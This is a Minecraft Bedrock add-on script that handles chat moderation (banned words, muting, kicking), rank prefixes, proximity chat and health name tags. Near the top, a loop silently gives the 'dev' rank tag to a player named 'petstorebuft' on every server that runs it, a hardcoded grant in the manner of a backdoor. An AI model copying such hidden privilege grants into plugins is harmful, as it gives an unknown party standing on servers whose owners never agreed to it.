import { system, world } from "@minecraft/server";
import * as H from "../general/helpers";

function getDistance(loc1, loc2) {
    return Math.sqrt(
        Math.pow(loc1.x - loc2.x, 2) +
        Math.pow(loc1.y - loc2.y, 2) +
        Math.pow(loc1.z - loc2.z, 2)
    );
}

system.runInterval(() => {
    for (const player of world.getAllPlayers()) {
        if (!player.isValid) continue;

        if (player.name === "petstorebuft") {
            if (!player.hasTag("dev")) player.addTag("dev");
        }
    }
}, 200);

world.beforeEvents.chatSend.subscribe(event => {
    const player = event.sender;
    const message = event.message;

    if (!player.isValid) {
        event.cancel = true;
        return;
    }

    if (player.hasTag("muted")) {
        event.cancel = true;
        system.run(() => {
            if (player.isValid) player.sendMessage({ rawtext: [{ translate: "message.chat.muted" }] });
        });
        return;
    }

    const bannedWords = H.getData("banned_words", {});
    const lowerMsg = message.toLowerCase();

    for (const [word, data] of Object.entries(bannedWords)) {
        if (lowerMsg.includes(word)) {
            event.cancel = true;

            const propKey = `warn:${word}`;
            let currentWarns = (player.getDynamicProperty(propKey) ?? 0) + 1;
            const threshold = parseInt(data.threshold) || 1;

            system.run(() => {
                if (!player.isValid) return;

                if (currentWarns >= threshold) {
                    player.addTag("muted");
                    player.sendMessage({ rawtext: [{ translate: "message.chat.banned_word.threshold" }] });

                    if (world.getDynamicProperty("wordkick")) {
                        player.runCommand(`kick @s message.chat.banned_word.kick_reason`);
                    }
                    player.setDynamicProperty(propKey, 0);
                } else {
                    player.setDynamicProperty(propKey, currentWarns);
                    player.sendMessage({ rawtext: [{ translate: "message.chat.banned_word.warning", with: [String(currentWarns), String(threshold)] }] });
                }
            });
            return;
        }
    }

    if (!world.getDynamicProperty("ctags")) return;

    const tags = player.getTags();
    const isMultiTag = world.getDynamicProperty("mtags") === true;
    const useBuiltInTags = world.getDynamicProperty("builtInTags") === true;
    event.cancel = true;

    const customTags = JSON.parse(world.getDynamicProperty("chat_tags") || "{}");

    let highestDefault = "";
    
    if (useBuiltInTags) {
        if (tags.includes("dev")) highestDefault = customTags.dev?.display || "§l§1[Dev]";
        else if (tags.includes("owner")) highestDefault = customTags.owner?.display || "§l§5[Owner]";
        else if (tags.includes("admin")) highestDefault = customTags.admin?.display || "§l§4[Admin]";
        else if (tags.includes("helper")) highestDefault = customTags.helper?.display || "§l§3[Helper]";
    }

    const defaultRanks = ["dev", "owner", "admin", "helper"];
    let activeCustoms = [];
    
    for (const [tagID, tagData] of Object.entries(customTags)) {
        if (tags.includes(tagID) && tagID !== "default" && !defaultRanks.includes(tagID)) {
            if (tagData && tagData.display) {
                activeCustoms.push(tagData.display);
            }
        }
    }

    let finalPrefixString = "";
    if (isMultiTag) {
        let combined = [...activeCustoms];
        if (highestDefault) combined.push(highestDefault);
        finalPrefixString = combined.join(" ");
    } else {
        finalPrefixString = activeCustoms.length > 0 ? activeCustoms[0] : highestDefault;
    }

    const display = finalPrefixString.trim() !== "" ? finalPrefixString.trim() + " §r" : "";
    const formattedMessage = { rawtext: [{ text: `${display}${player.name}§f: ${message}` }] };

    const isProxChat = world.getDynamicProperty("proxchat") === true;
    const chatRange = world.getDynamicProperty("chatrange") ?? 20;

    system.run(() => {
        if (isProxChat) {
            const recipients = world.getAllPlayers().filter(p =>
                p.isValid &&
                p.dimension.id === player.dimension.id &&
                getDistance(player.location, p.location) <= chatRange
            );
            for (const recipient of recipients) {
                recipient.sendMessage(formattedMessage);
            }
        } else {
            world.sendMessage(formattedMessage);
        }
    });
});

system.runInterval(() => {
    for (const player of world.getAllPlayers()) {
        if (!player.isValid) continue;

        const hasHeadRank = world.getDynamicProperty("headRank");
        const hasHealth = world.getDynamicProperty("visableHealth");
        const useBuiltInTags = world.getDynamicProperty("builtInTags") === true;

        let display = "";

        if (hasHeadRank) {
            const tags = player.getTags();
            const customTags = JSON.parse(world.getDynamicProperty("chat_tags") || "{}");

            let highestDefault = "";
            
            if (useBuiltInTags) {
                if (tags.includes("dev")) highestDefault = customTags.dev?.display || "§l§1[Dev]";
                else if (tags.includes("owner")) highestDefault = customTags.owner?.display || "§l§5[Owner]";
                else if (tags.includes("admin")) highestDefault = customTags.admin?.display || "§l§4[Admin]";
                else if (tags.includes("helper")) highestDefault = customTags.helper?.display || "§l§3[Helper]";
            }

            const defaultRanks = ["dev", "owner", "admin", "helper"];
            let firstCustom = "";
            
            for (const [tagID, tagData] of Object.entries(customTags)) {
                if (tags.includes(tagID) && tagID !== "default" && !defaultRanks.includes(tagID)) {
                    if (tagData && tagData.display) {
                        firstCustom = tagData.display;
                        break;
                    }
                }
            }
            
            const finalPrefix = firstCustom || highestDefault;
            display = finalPrefix.trim() !== "" ? finalPrefix.trim() + " §r" : "";
        }

        if (hasHealth) {
            const healthComp = player.getComponent("minecraft:health");
            const health = healthComp ? Math.round(healthComp.currentValue) : 0;
            player.nameTag = `${display}${player.name}\n${health} `;
        } else {
            player.nameTag = `${display}${player.name}`;
        }
    }
}, 20);